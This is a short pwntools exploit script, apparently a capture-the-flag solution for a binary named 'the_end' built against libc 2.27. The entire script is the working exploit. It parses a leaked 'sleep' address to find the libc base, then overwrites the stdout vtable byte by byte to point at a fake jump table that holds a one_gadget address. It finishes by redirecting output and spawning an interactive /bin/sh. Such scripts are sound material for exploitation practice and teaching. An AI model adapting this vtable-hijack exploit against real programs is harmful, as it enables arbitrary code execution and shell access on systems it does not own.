from pwn import *

context(log_level='debug')

io=process("./the_end")

libc=ELF("./libc-2.27.so")

io.recvuntil(b'gift ')

sleep=int(io.recvuntil(b',',drop=True),16)

print(hex(sleep))

one_gadget=[0x4f2c5,0x4f322,0x10a38c]

IO_file_jumps=0x3EC838

fake_io_jump=0x3EC7A0

remote_addr=fake_io_jump+0x58

libc_base=sleep-libc.symbols['sleep']

stdout_vtable=IO_file_jumps+libc_base

Fake=fake_io_jump+libc_base

Remote=remote_addr+libc_base

one=one_gadget[0]+libc_base

#修改两字节

#payload=p64(stdout_vtable)+p64(Fake)[0]+p64(stdout_vtable+1)+p64(Fake)[1]

for i in range(2):
	io.send(p64(stdout_vtable+i))
	io.send(str(p64(Fake)[i]))

#修改三字节

#payload+=p64(Remote)+p64(one)[0]+p64(Remote+1)+p64(one)[1]+p64(Remote+2)+p64(one)[2]

for i in range(3):
	io.send(p64(Remote+i))
	io.send(str(p64(one)[i]))

#io.send(payload)
#io=remote()
io.sendline("exec /bin/sh 1>&0")

io.interactive()